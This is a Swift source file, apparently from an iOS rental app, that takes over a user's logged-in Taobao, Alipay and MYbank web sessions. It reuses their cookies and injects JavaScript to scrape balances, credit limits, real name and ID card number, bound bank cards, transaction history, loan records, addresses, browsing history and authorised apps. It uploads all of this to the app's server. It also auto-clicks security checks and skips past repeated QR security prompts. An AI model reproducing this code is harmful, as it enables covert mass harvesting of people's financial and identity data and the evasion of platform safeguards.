//
//  TaoBaoAuthorized+WK.swift
//  NiuNiuRent
//
//  Created by Q Z on 2023/7/12.
//

import UIKit
import WebKit
private var delayTime: DispatchTime = .now() + .milliseconds(100)

extension TaoBaoAuthorizedManager {
    /**我的支付宝信息
     * 余额宝1
     * 余额2
     * 花呗3
     */
    func upMyZfbInfo(url: String?, t1: String, t2: String, type: Int) {
        log.info("upMyZfbInfo上报数据: " + t1 + "类型: \(type)")
        if type == 1 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "yuebao")
        } else if type == 2 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "yue")
        } else if type == 3 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "huabei")
            PostDataDTO.shared.postData(path: "index_money", content: t2, type: "huabei_total")
        }
    }
    
    /// 淘宝实名认证
    func tbAuthenticationName(url: String?, name: String, idCard: String) {
        log.info("淘宝实名认证: \(url ?? "")" + "name: \(name)")
        if url?.contains("https://member1.taobao.com/member/fresh/certify%20info.htm") == true{
            let body = ["name": name, "idcard": idCard]
            PostDataDTO.shared.postData(path: "index_money", content: body.toJson(), type: "taobao_auth_user")
        }
    }
    
    /// 账单
    func upBill(url: String?, body: String, sizeMonth: String) {
        log.info("upBill账单明细: \(url ?? "")" + "月数: \(sizeMonth)")
        if url?.contains("https://consumeprod.alipay.com/record/standard.htm") == true{
            if sizeMonth == "3" {
                PostDataDTO.shared.postData(path: "three_month_repay", content: body)
            } else {
                PostDataDTO.shared.postData(path: "alipay_money", content: body, month: "\(sizeMonth)")
            }
        }
    }

    func showHtml(url: String?, body: String) {
        log.info("⚠️⚠️⚠️⚠️showHtml⚠️⚠️⚠️⚠️)")
        //网商个人信息
        if url?.contains("loan/profile.htm") == true {
            PostDataDTO.shared.postData(path: "bank_profile", content: body)
        }
        
        //网商还款信息
        if url?.hasPrefix("https://loanweb.mybank.cn/repay/home.html") == true {
            PostDataDTO.shared.postData(path: "bank_repay", content: body)
        }
        
        //网商借款信息
        if url?.hasPrefix("https://loanweb.mybank.cn/repay/record.html") == true {
            PostDataDTO.shared.postData(path: "bank_record", content: body)
        }
        
        // 淘宝地址
        if url?.contains("deliver_address.htm") == true {
            PostDataDTO.shared.postData(path: "address", content: body)
        }
        
        // 我的足迹 footmark/tbfoot
        if url?.contains("footmark/tbfoot") == true {
            PostDataDTO.shared.postData(path: "foot_mark", content: body)
        }
        
        //账号信息 account/index.htm
        if url?.contains("https://custweb.alipay.com/account/index.htm") == true {
            PostDataDTO.shared.postData(path: "parse_alipay_base_info", content: body)
        }
        
        //金额统计
        if url?.contains("https://consumeprod.alipay.com/record/standard.htm") == true {
            if body.hasPrefix("已支出") == true {
                PostDataDTO.shared.postData(path: "alipay_money", content: body)
            }
        }
        
        // 代扣
        if url?.contains("account/mdeductAndToken.htm") == true {
            PostDataDTO.shared.postData(path: "parse_withhold", content: body)
        }
        
        // 应用授权
        if url?.contains("auth/tokenManage.htm") == true {
            PostDataDTO.shared.postData(path: "parse_auth", content: body)
        }
        
        //消息 messager/new.htm
        if url?.contains("messager/new.htm") == true {
            PostDataDTO.shared.postData(path: "parse_notice", content: body)
        }
        
        // 绑卡信息https://zht.alipay.com/asset/bankList.htm
        if url?.contains("asset/bankList.htm") == true {
            PostDataDTO.shared.postData(path: "bind_bank", content: body)
        }
    }
}

extension TaoBaoAuthorizedManager {
    func loginSuccess(webView: WKWebView, absoluteString: String?) {
        let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
        cookieStore.getAllCookies({ [weak self] cook in
            self?.cookieArray = cook
        })
        if let url = URL(string: TaoBaoSpider.shared.memberInfoURL) {
            storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
            DispatchQueue.global().async {
                TaoBaoSpider.shared.getMemberInfo()
            }
        }
    }
    
    func getOrders(webView: WKWebView, absoluteString: String?) {
        let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
        cookieStore.getAllCookies({ [weak self] cook in
            self?.cookieArray = cook
        })
        if let url = URL(string: TaoBaoSpider.shared.ordersURL) {
            storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
            TaoBaoSpider.shared.getOrders { [weak self] orderHtml in
                if let orderHtml = orderHtml {
                    self?.parseOrderDetails(orderHtml: orderHtml, absoluteString: absoluteString)
                }
            }
        }
    }
    
    func getAccreditData(webView: WKWebView, totalPage: Int) {
        let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
        cookieStore.getAllCookies({ [weak self] cook in
            self?.cookieArray = cook
        })
        if let url = URL(string: TaoBaoSpider.shared.tokenManageURL) {
            storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
            for idx in 2...totalPage {
                Thread.sleep(forTimeInterval: 0.1)
                DispatchQueue.global().async {
                    TaoBaoSpider.shared.getAccreditDetail(url: URL(string: TaoBaoSpider.shared.tokenManageURL + "?pageNo=\(idx)")!)
                }
            }
        }
    }

    func parseOrderDetails(orderHtml: String, absoluteString: String?) {
        log.info("orderHtmlorderHtmlorderHtml:\(orderHtml)")
        if String.isEmpty(orderHtml) {
            DispatchQueue.global().async {
                let property = ["error": "body is empty",
                                "url": absoluteString ?? ""]
                TrackManager.default.track(.TBErrorMessage, property: property)
            }
        }
        var orderHtmlString = orderHtml.components(separatedBy: "JSON.parse('")[safe: 1]
        orderHtmlString = orderHtmlString?.components(separatedBy: "');")[safe: 0]
        orderHtmlString = orderHtmlString?.replacingOccurrences(of: "\\\"", with: "\"")
        let dic = orderHtmlString?.toDictionary()
        let array = dic?["mainOrders"] as? [[String: Any]]
        array?.forEach({ [weak self] obj in
            if #available(iOS 13.0, *) {
                Task {
                    let statusInfo = obj["statusInfo"] as? [String: Any]
                    if let orderUrl = statusInfo?["url"] as? String,
                       let url = URL(string: "https:" + orderUrl) {
                        self?.getOrderDetail(url)
                    }
                }
            } else {
                let statusInfo = obj["statusInfo"] as? [String: Any]
                if let orderUrl = statusInfo?["url"] as? String,
                   let url = URL(string: "https:" + orderUrl) {
                    self?.getOrderDetail(url)
                }
            }
        })
    }
    
    func getOrderDetail(_ url: URL) {
        let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
        cookieStore.getAllCookies({ [weak self] cook in
            self?.cookieArray = cook
        })
        storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
        DispatchQueue.global(qos: .default).async {
            TaoBaoSpider.shared.getOrderDetails(url: url)
        }
    }
    
    func getAddress(webView: WKWebView, absoluteString: String?) {
        if self.getAddress == false {
            self.getAddress = true
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://member1.taobao.com/member/fresh/deliver_address.htm")
            }
            return
        }
    }
    
    // 我的足迹
    func getTbfoot(webView: WKWebView, absoluteString: String?)  {
        if absoluteString?.hasPrefix("https://member1.taobao.com/member/fresh/deliver_address.htm") == true{
            let addressJS = "var url = window.location.href;" +
            "var address = document.getElementsByClassName(\"next-table-body\")[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":address};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://www.taobao.com/markets/footmark/tbfoot")
            }
        }
    }
    
    // 加载淘宝实名认证页面
    func getTbAuthenticationName(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://www.taobao.com/markets/footmark/tbfoot") == true{
            let addressJS = "var url = window.location.href;" +
            "var address = document.getElementsByClassName('J_ModContainer')[1].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":address};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
          
            evaluateJavaScript(addressJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://member1.taobao.com/member/fresh/certify%20info.htm")
            }
        }
    }
    
    // 加载淘宝首页
    func getTbHome(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://member1.taobao.com/member/fresh/certify%20info.htm") == true{
            let addressJS = "var url = window.location.href;" +
            "var name = document.querySelector(\"#main-content > div > div.certify-info > div.msg-box-content > div:nth-child(3) > div\").textContent;" +
            "var idCard = document.querySelector(\"#main-content > div > div.certify-info > div.msg-box-content > div:nth-child(4) > div\").textContent;" +
            "var data = {\"url\":url,\"name\":name,\"idCard\":idCard};" +
            "window.webkit.messageHandlers.tbAuthenticationName.postMessage(data);"
          
            evaluateJavaScript(addressJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://i.taobao.com/my_taobao.htm")
            }
        }
    }
    
//     网商信息 start
    func getWSMsg(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://login.mybank.cn/login/loginhome.htm") == true{
            let WSMsg = "document.getElementsByClassName(\"userName___1vTUS\")[0].getElementsByTagName(\"span\")[0].click();\n" +
            "setTimeout(function () {\n" +
            "\tdocument.getElementsByClassName(\"logoLoad___78Syr\")[0].click();\n" +
            "},3000);"
            evaluateJavaScript(WSMsg)
        }
    }
    
    // 网商个人信息
    func getWSHome(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://loan.mybank.cn/loan/profile.htm") == true{
            evaluateJavaScript(getHtmlJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://loanweb.mybank.cn/repay/home.html")
            }
        }
    }
    
    // 网商还款信息
    func getWSRepayHome(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://loanweb.mybank.cn/repay/home.html") == true{
            evaluateJavaScript(getHtmlJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://loanweb.mybank.cn/repay/record.html")
            }
        }
    }
    
    // 网商借款信息
    func getWSRepayRecord(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://loanweb.mybank.cn/repay/record.html") == true{
            evaluateJavaScript(getHtmlJS)
        }
    }
    
    // 网商信息 end
    func getSwitchPersonal(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://b.alipay.com/page/home") == true{
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://shanghu.alipay.com/home/switchPersonal.htm")
            }
        }
    }
    
    // 支付宝信息 start
    func getZFBAccount(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://my.alipay.com/portal/i.htm") == true || absoluteString?.hasPrefix("https://personalweb.alipay.com/portal/i.htm") == true{
            log.info("进入支付宝成功")
            //点击花呗余额
            let huabeiJS = "document.getElementById(\"showHuabeiAmount\").click();" +
            "setTimeout(function(){\n" +
            "var url = window.location.href;\n" +
            "var text1 = document.querySelector(\"#account-amount-container\").textContent;\n" +
            "var text2 = document.querySelector(\"#credit-amount-container\").textContent;\n" +
            "var data = {\"url\":url,\"t1\":text1,\"t2\":text2,\"type\":3};" +
            "window.webkit.messageHandlers.upMyZfbInfo.postMessage(data);\n" +
            "},100);"
            evaluateJavaScript(huabeiJS)
            Thread.sleep(forTimeInterval: 0.1)
            
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://yebprod.alipay.com/yeb/purchase.htm")
            }
        }
    }
    
    // 进入余额宝
    func getYebPurchase(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://yebprod.alipay.com/yeb/purchase.htm") == true {
            //点击账户余额宝
            let yueb =
            "var url = window.location.href;\n" +
            "var text = document.querySelector(\"#J_vailableQuotient\").textContent;\n" +
            "var data = {\"url\":url,\"t1\":text,\"t2\":text,\"type\":1};" +
            "window.webkit.messageHandlers.upMyZfbInfo.postMessage(data);\n"
            evaluateJavaScript(yueb)
            Thread.sleep(forTimeInterval: 0.1)
            //点击账户余额
            let yue =
            "var url = window.location.href;\n" +
            "var text = document.querySelector(\"#J_fundPurchaseForm > div:nth-child(4) > p > span\").textContent;\n" +
            "var data = {\"url\":url,\"t1\":text,\"t2\":text,\"type\":2};" +
            "window.webkit.messageHandlers.upMyZfbInfo.postMessage(data);\n"
            evaluateJavaScript(yue)
            Thread.sleep(forTimeInterval: 0.1)
            
            aliIndex = true
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://custweb.alipay.com/account/index.htm")
            }
        }
    }
    
    // 支付宝交易记录
    func getRecordStandard(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://consumeprod.alipay.com/record/standard.htm") == true {
            log.info("进入交易记录")
            Thread.sleep(forTimeInterval: 0.1)
            upBill(currMonth: "1", absoluteString: absoluteString)
            Thread.sleep(forTimeInterval: 0.75)
            
            var jS = "document.querySelector(\"#J-three-month\").click();"
            evaluateJavaScript(jS)
            Thread.sleep(forTimeInterval: 0.1)
            upBill(currMonth: "3", absoluteString: absoluteString)
            Thread.sleep(forTimeInterval: 0.75)
            
            jS = "document.querySelector(\"#J-one-year\").click();"
            evaluateJavaScript(jS)
            Thread.sleep(forTimeInterval: 0.1)
            upBill(currMonth: "12", absoluteString: absoluteString)
            Thread.sleep(forTimeInterval: 0.75)
            
            DispatchQueue.main.asyncAfter(deadline: delayTime + 1) {
                self.loadUrlStr("https://loan.mybank.cn/loan/profile.htm")
            }
        }
        
        if zhifubao == true && absoluteString?.hasPrefix("https://consumeprod.alipay.com/record/checkSecurity.htm") == true {
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://custweb.alipay.com/account/index.htm")
            }
        }
        
        func upBill(currMonth: String, absoluteString: String?){
            var monthJs = "var data = {\"url\":url,\"responseText\":address,\"currMonth\": 1};"
            if currMonth == "3" {
                monthJs = "var data = {\"url\":url,\"responseText\":address,\"currMonth\": 3};"
            }
            if currMonth == "12" {
                monthJs = "var data = {\"url\":url,\"responseText\":address,\"currMonth\": 12};"
            }
            let addressJS = "document.getElementsByClassName(\"action-content\")[0].getElementsByClassName(\"amount-links\")[0].click();" +
            "setTimeout(function(){\n" +
            "var url = window.location.href;\n" +
            "var address = document.getElementsByClassName(\"amount-detail\")[0].innerHTML;\n" +
            monthJs +
            "window.webkit.messageHandlers.showHtml.postMessage(data);" +
            //上报明细
            "window.webkit.messageHandlers.upBill.postMessage(data);" +
            "},500);"
            evaluateJavaScript(addressJS)
        }
    }
    
    // 阿里基本信息
    func getAliBaseMsg(webView: WKWebView, absoluteString: String?) {
        if zhifubao == true &&
            absoluteString?.hasPrefix("https://custweb.alipay.com/account/index.htm") == true {
           log.info("阿里基本信息")
            let addressJS = "var url = window.location.href;" +
            "var body = document.getElementsByTagName('html')[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":body};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            if aliIndex == true {
                DispatchQueue.main.asyncAfter(deadline: delayTime) {
                    self.loadUrlStr("https://personalweb.alipay.com/account/mdeductAndToken.htm")
                }
            } else {
                DispatchQueue.main.asyncAfter(deadline: delayTime) {
                    self.loadUrlStr("https://my.alipay.com/portal/i.htm")
                }
            }
        }
    }
    
    // 阿里代扣
    func getMdeductAndToken(webView: WKWebView, absoluteString: String?) {
        if zhifubao == true &&
            absoluteString?.hasPrefix("https://personalweb.alipay.com/account/mdeductAndToken.htm") == true {
            let addressJS = "var url = window.location.href;" +
            "var body = document.getElementsByTagName('html')[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":body};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://openauth.alipay.com/auth/tokenManage.htm")
            }
        }
    }
    
    // 应用授权
    func getAuthTokenManage(webView: WKWebView, absoluteString: String?) {
        if zhifubao == true &&
            absoluteString?.hasPrefix("https://openauth.alipay.com/auth/tokenManage.htm") == true {
            let addressJS = "var url = window.location.href;" +
            "var body = document.getElementsByTagName('html')[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":body};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);" +
            "var pageSize = document.querySelector(\"#account-main > div:nth-child(2) > div > a:nth-child(3)\").getAttribute(\"href\");\n" +
            "var pageData = {\"responseText\":pageSize};" +
            "window.webkit.messageHandlers.accreditPage.postMessage(pageData);"
            evaluateJavaScript(addressJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://couriercore.alipay.com/messager/new.htm")
            }
        }
    }
    
    // 消息
    func getAliMessager(webView: WKWebView, absoluteString: String?) {
        if zhifubao == true &&
            absoluteString?.hasPrefix("https://couriercore.alipay.com/messager/new.htm") == true {
            let addressJS = "var url = window.location.href;" +
            "var body = document.getElementsByTagName('html')[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":body};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://zht.alipay.com/asset/bankList.htm")
            }
        }
    }
    
    // 绑卡信息https://zht.alipay.com/asset/bankList.htm
    func getÅssetBankList(webView: WKWebView, absoluteString: String?) {
        if zhifubao == true &&
            absoluteString?.hasPrefix("https://zht.alipay.com/asset/bankList.htm") == true {
            Thread.sleep(forTimeInterval: 0.5)
            let addressJS = "var url = window.location.href;" +
            "var body = document.getElementsByClassName(\"card-box-list\")[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":body};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            DispatchQueue.main.asyncAfter(deadline: delayTime) {
                self.loadUrlStr("https://consumeprod.alipay.com/record/standard.htm")
            }
        }
    }
    
    // 支付宝加载失败
    func getAlipayError(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://auth.alipay.com/error") == true || absoluteString?.hasPrefix("https://render.alipay.com/p/s/alipay_site/wait") == true  {
            log.info("支付宝登录,跳转失败返回上一页")
            DispatchQueue.global().async {
                let property = ["error": "entry failure",
                                "url": absoluteString ?? ""]
                TrackManager.default.track(.TBErrorMessage, property: property)
            }
            DispatchQueue.main.async {
                webView.goBack()
            }
        }
        
        if absoluteString?.hasPrefix("https://authstl.alipay.com/login/trustLoginResultDispatch.htm") == true{
            // 需要点击蓝色按钮， J-submit-cert-check
            for idx in 1...10 {
                log.info("蓝色按钮\(idx)")
                let gotoAliJS = "document.getElementById(\"J-submit-cert-check\").click()"
                evaluateJavaScript(gotoAliJS)
                Thread.sleep(forTimeInterval: 0.5)
                if idx == 10 {
                    DispatchQueue.global().async {
                        let property = ["error": "entry failure",
                                        "url": "document.getElementById(\"J-submit-cert-check\").click()"]
                        TrackManager.default.track(.TBErrorMessage, property: property)
                    }
                    DispatchQueue.main.async {
                        webView.goBack()
                    }
                }
            }
        }
    }
    
    func getCheckSecurity(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://consumeprod.alipay.com/errorSecurity.htm") == true || absoluteString?.hasPrefix("https://consumeprod.alipay.com/record/checkSecurity.htm") == true  {
            log.info("出现支付宝扫码")
            scanNum += 1
            if scanNum <= 3 {
                DispatchQueue.main.async {
                    webView.goBack()
                }
                
                DispatchQueue.global().async {
                    let property = ["error": "entry failure",
                                    "url": "https://loan.mybank.cn/loan/profile.htm"]
                    TrackManager.default.track(.TBErrorMessage, property: property)
                }
            } else {
                DispatchQueue.main.asyncAfter(deadline: delayTime) {
                    self.loadUrlStr("https://loan.mybank.cn/loan/profile.htm")
                }
            }
        }
    }
    
    func evaluateJavaScript(_ jsStr: String) {
        DispatchQueue.main.async { [weak self] in
            self?.webView.evaluateJavaScript(jsStr){ data, error in}
        }
    }
    
    func loadUrlStr(_ urlStr: String) {
        DispatchQueue.main.async { [weak self] in
            let url = URL(string: urlStr)!
            let request =  URLRequest(url: url)
            self?.webView.load(request)
        }
    }
}
